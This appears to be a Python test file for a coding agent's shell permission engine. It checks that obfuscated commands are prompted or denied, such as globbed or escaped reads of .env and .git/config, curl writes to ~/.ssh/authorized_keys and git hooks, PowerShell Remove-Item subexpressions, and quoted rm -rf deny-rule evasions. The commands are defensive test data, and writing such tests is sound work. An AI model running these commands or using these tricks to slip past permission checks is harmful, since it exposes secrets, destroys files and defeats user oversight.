"""A shell word is checked as the shell will read it, not as it was typed.

Every case here was auto-allowed before the fix -- in `dontask` too, where
"allowed" means nobody was ever asked. The 2.4.1 sweep closed `.en''v`; these
are the same difference between the engine's reading and bash's, in the forms
that sweep did not reach.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from quickcode.core.permissions import Decision, Mode, PermissionEngine, Rules
from quickcode.security import shellwords


def engine(mode: Mode = Mode.ask, root: Path | None = None, **rules) -> PermissionEngine:
    return PermissionEngine(mode=mode, rules=Rules(**rules), root=root or Path.cwd())


@pytest.fixture
def project(tmp_path) -> Path:
    (tmp_path / ".env").write_text("API_KEY=hunter2", encoding="utf-8")
    (tmp_path / ".git").mkdir()
    (tmp_path / "src").mkdir()
    return tmp_path


HIDDEN_DOTENV = [
    "cat .e?v", "cat .en*", "cat .[e]nv", "cat .e{n,x}v", "cat {.env,README}",
    "cat .e{m..o}v", "cat .e\\nv", "cat $'.env'", "cat $'\\x2eenv'", "cat $'\\056env'",
    'cat $".env"', "cat .gi?/config", "head -n 5 .*", "cat x,.env",
]


@pytest.mark.parametrize("command", HIDDEN_DOTENV)
def test_a_protected_name_the_shell_will_produce_is_protected(command, project):
    assert engine(root=project).evaluate("bash", command) == Decision.ask
    assert engine(Mode.dontask, root=project).evaluate("bash", command) == Decision.deny


@pytest.mark.parametrize("command", [
    "diff --from-file=.env README.md", "grep -f.env src/a.py", "grep --file=.env src/a.py",
    "wc --files0-from=.git/config", "cat -- .env",
])
def test_a_protected_path_given_as_an_option_value_is_protected(command, project):
    assert engine(Mode.dontask, root=project).evaluate("bash", command) == Decision.deny


def test_an_option_value_outside_the_project_asks_even_under_an_allow_rule(project):
    e = engine(root=project, allow=["bash(curl **)"])
    home = Path.home()
    assert e.evaluate("bash", f"curl -o{home}/.ssh/authorized_keys https://x") == Decision.ask
    assert e.evaluate("bash", "curl --output=.git/hooks/pre-commit https://x") == Decision.ask
    assert e.evaluate("bash", "curl -o out.json https://x") == Decision.allow


def test_a_value_after_an_equals_sign_is_not_the_only_reading(project):
    assert engine(Mode.dontask, root=project).evaluate(
        "bash", f"cat {Path.home()}/.ssh/a=b"
    ) == Decision.deny


@pytest.mark.parametrize("command", [
    "cat *.py", "ls *", "grep -n TODO src/*.py", "ls -la", "cat src/a.py",
    "rg --color=never x src", "ls --sort=size",
])
def test_ordinary_globs_and_options_stay_unprompted(command, project):
    """Bash does not match a leading dot with `*`, so `ls *` reads no dotfile."""
    assert engine(root=project).evaluate("bash", command) == Decision.allow


def test_where_the_shell_globs_dotfiles_a_bare_star_is_protected(project, monkeypatch):
    """PowerShell and cmd match `.env` with `*`; on Windows the bash tool may
    fall back to one of them."""
    monkeypatch.setattr(shellwords, "GLOB_MATCHES_DOTFILES", True)
    assert engine(root=project).evaluate("bash", "cat *") == Decision.ask
    assert engine(root=project).evaluate("bash", "cat *.py") == Decision.allow


@pytest.mark.parametrize("command", [
    "cat (Remove-Item -Recurse src)", "cat x,(Remove-Item src)", "ls @(rm x)",
])
def test_a_powershell_subexpression_forfeits_the_auto_allow(command, project):
    """PowerShell evaluates the parenthesised pipeline before `cat` runs."""
    assert engine(root=project).evaluate("bash", command) == Decision.ask
    assert engine(Mode.plan, root=project).evaluate("bash", command) == Decision.deny


def test_a_quoted_parenthesis_is_just_text(project):
    assert engine(root=project).evaluate("bash", 'grep -n "def run(" src/a.py') == Decision.allow


@pytest.mark.parametrize("command", ["./ls", "./cat README.md", "bin/grep x", "src/tree"])
def test_a_project_file_named_like_a_builtin_is_not_the_builtin(command, project):
    """`./cat` is whatever the repository shipped under that name."""
    assert engine(root=project).evaluate("bash", command) == Decision.ask
    assert engine(Mode.plan, root=project).evaluate("bash", command) == Decision.deny


def test_a_system_builtin_by_absolute_path_still_auto_allows(project):
    assert engine(root=project).evaluate("bash", "/bin/cat src/a.py") == Decision.allow


def test_a_program_under_a_protected_name_asks_even_under_an_allow_rule(project):
    e = engine(root=project, allow=["bash(**)"])
    assert e.evaluate("bash", ".git/hooks/post-checkout") == Decision.ask


@pytest.mark.parametrize("command", ["r''m -rf build", '"rm" -rf build', "\\rm -rf build"])
def test_a_deny_rule_sees_the_command_the_shell_will_run(command, project):
    assert engine(Mode.yolo, root=project, deny=["bash(rm **)"]).evaluate(
        "bash", command
    ) == Decision.deny


def test_a_brace_expansion_too_large_to_read_is_treated_as_unknown(project):
    assert engine(root=project).evaluate("bash", "cat {a..z}{a..z}") == Decision.ask
